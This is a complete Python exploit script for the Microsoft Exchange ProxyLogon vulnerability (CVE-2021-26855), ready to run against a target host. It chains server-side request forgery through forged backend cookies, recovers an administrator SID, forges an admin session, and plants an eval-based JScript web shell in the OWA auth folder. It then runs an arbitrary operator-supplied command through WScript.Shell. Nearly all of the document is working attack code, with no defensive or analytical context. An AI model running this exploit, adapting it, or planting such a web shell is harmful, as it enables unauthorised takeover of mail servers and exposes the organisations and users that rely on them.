# -*- coding: utf-8 -*-
import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
    
random_name = id_generator(4) + ".js"

if len(sys.argv) < 3:
    print("Usage: python3 proxylogon_rce.py <target> <email> <command>")
    print("Usage: python3 proxylogon_rce.py IP administrator@domain.local whoami")
    exit()
 
# banner
print("\n-------------------------------") 
print("-- ProxyLogon CVE-2021-26855 --")
print("-------------------------------\n")

# user input
target = sys.argv[1]
email = sys.argv[2]
command = sys.argv[3]

# user agent
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"

# shell name and path
shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test1337.aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

# webshell
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>'

autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % email

print("Running exploit code on Exchange Server: " + target)
FQDN = "EXCHANGE01"

ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                        "User-Agent": user_agent},
                  verify=False)

if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
    FQDN = ct.headers["X-FEServer"]


ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "User-Agent": user_agent},
                   data=autoDiscoverBody,
                   verify=False
                   )

if ct.status_code != 200:
    print(ct.status_code)
    print("Autodiscover Error!")
    exit()

if "<LegacyDN>" not in str(ct.content):
    print("\nCan not get LegacyDN!")
    exit()

legacyDn = str(ct.content).split("<LegacyDN>")[1].split(r"</LegacyDN>")[0]
print("\nDN:         " + legacyDn)

mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" % FQDN,
    "Content-Type": "application/mapi-http",
    "X-Requesttype": "Connect",
    "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
    "X-Clientapplication": "Outlook/15.0.4815.1002",
    "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
    "User-Agent": user_agent
},
                   data=mapi_body,
                   verify=False,
                   )
if ct.status_code != 200 or "act as owner of a UserMailbox" not in str(ct.content):
    print("Mapi Error!")
    exit()

sid = str(ct.content).split("with SID ")[1].split(" and MasterAccountSid")[0]

print("SID:        " + sid)
sid = sid.replace(sid.split("-")[-1],"500")

proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
""" % sid

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "msExchLogonMailbox": "S-1-5-20",
    "User-Agent": user_agent
},
                   data=proxyLogon_request,
                   verify=False
                   )
if ct.status_code != 241 or not "set-cookie" in ct.headers:
    print("Proxylogon Error!")
    exit()

sess_id = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]

msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
print("Session id: " + sess_id)
print("Canary:     " + msExchEcpCanary)

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; ",
    "msExchLogonMailbox": "S-1-5-20",
    "User-Agent": user_agent

},
                   json={"filter": {
                       "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                      "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
                   verify=False
                   )

if ct.status_code != 200:
    print("OAB Error!")
    exit()
oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
print("OAB id:     " + oabId)

oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {
                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                               "ExternalUrl": "http://ffff/#%s" % shell_content}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "msExchLogonMailbox": "S-1-5-20",
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": user_agent
},
                   json=oab_json,
                   verify=False
                   )
if ct.status_code != 200:
    print("Set external url Error!")
    exit()

reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                  "properties": {
                      "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                     "FilePathName": shell_absolute_path}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "msExchLogonMailbox": "S-1-5-20",
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": user_agent
},
                   json=reset_oab_body,
                   verify=False
                   )

if ct.status_code != 200:
    print("problem with the shell, exiting !")
    exit()

print("\nSubmiting shell on https://"+target+"/owa/auth/test1337.aspx")
shell_url="https://"+target+"/owa/auth/test1337.aspx"
data=requests.post(shell_url,data={"code":"Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"%s\").StdOut.ReadAll());" % (command)},verify=False)
if data.status_code != 200:
    print("Cannot write to shell")
else:
    print("Shell response: \n"+data.text.split("OAB (Default Web Site)")[0].replace("Name                            :",""))